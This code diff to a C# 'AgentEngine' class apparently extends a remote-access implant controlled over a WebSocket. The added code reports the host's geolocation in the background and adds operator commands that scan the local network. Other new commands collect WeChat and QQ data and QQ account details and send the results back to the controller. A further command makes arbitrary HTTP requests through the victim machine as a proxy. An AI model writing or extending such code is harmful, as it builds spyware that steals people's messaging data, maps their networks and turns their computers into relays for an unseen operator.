@@ -77,6 +77,21 @@ public class AgentEngine
             _ws = null;
         }
 
+        // Fetch geo info in background (cached for subsequent requests)
+        _ = Task.Run(async () =>
+        {
+            try
+            {
+                var geoJson = await NetworkInfo.WarmupGeoAsync();
+                if (geoJson != null && _ws != null && _ws.IsConnected)
+                {
+                    await _ws.SendResultAsync("agent.geo.update", _agentId,
+                        System.Text.Json.JsonSerializer.Deserialize<object>(geoJson));
+                }
+            }
+            catch { /* best-effort */ }
+        });
+
         // Run heartbeat + WS receive loop in parallel
         if (_ws != null)
         {
@@ -299,12 +314,24 @@ public class AgentEngine
                 await HandleSystemNetwork(msg, ct);
                 break;
 
+            case "system.lanscan":
+                await HandleSystemLanScan(msg, ct);
+                break;
+
             case "othersoft.wechat":
                 await HandleOtherSoftWeChat(msg, ct);
                 break;
 
             case "othersoft.qq":
                 await HandleOtherSoftQQ(msg, ct);
+                break;
+
+            case "othersoft.qqinfo":
+                await HandleOtherSoftQQInfo(msg, ct);
+                break;
+
+            case "proxy.fetch":
+                await HandleProxyFetch(msg, ct);
                 break;
         }
     }
@@ -608,6 +635,13 @@ public class AgentEngine
             await _ws.SendResultAsync("system.network.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
     }
 
+    private async Task HandleSystemLanScan(WebSocketMessage msg, CancellationToken ct)
+    {
+        var result = await LanScan.ScanAsync();
+        if (_ws != null)
+            await _ws.SendResultAsync("system.lanscan.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+    }
+
     private async Task HandleOtherSoftWeChat(WebSocketMessage msg, CancellationToken ct)
     {
         var result = OtherSoftware.CollectWeChat();
@@ -620,6 +654,31 @@ public class AgentEngine
         var result = OtherSoftware.CollectQQ();
         if (_ws != null)
             await _ws.SendResultAsync("othersoft.qq.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+    }
+
+    private async Task HandleOtherSoftQQInfo(WebSocketMessage msg, CancellationToken ct)
+    {
+        var qq = "";
+        try { qq = msg.Data?.GetProperty("qq").GetString() ?? ""; } catch { }
+        var result = await OtherSoftware.CollectQQInfoAsync(qq);
+        if (_ws != null)
+            await _ws.SendResultAsync("othersoft.qqinfo.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
+    }
+
+    private async Task HandleProxyFetch(WebSocketMessage msg, CancellationToken ct)
+    {
+        var url = "";
+        var method = "GET";
+        string? headers = null;
+        string? body = null;
+        try { url = msg.Data?.GetProperty("url").GetString() ?? ""; } catch { }
+        try { method = msg.Data?.GetProperty("method").GetString() ?? "GET"; } catch { }
+        try { headers = msg.Data?.GetProperty("headers").GetString(); } catch { }
+        try { body = msg.Data?.GetProperty("body").GetString(); } catch { }
+
+        var result = await ProxyBrowser.FetchAsync(url, method, headers, body);
+        if (_ws != null)
+            await _ws.SendResultAsync("proxy.fetch.result", _agentId, JsonSerializer.Deserialize<object>(result) ?? result, msg.RequestId);
     }
 
     // ── HTTP Task execution (heartbeat) ──────────────────────────────────
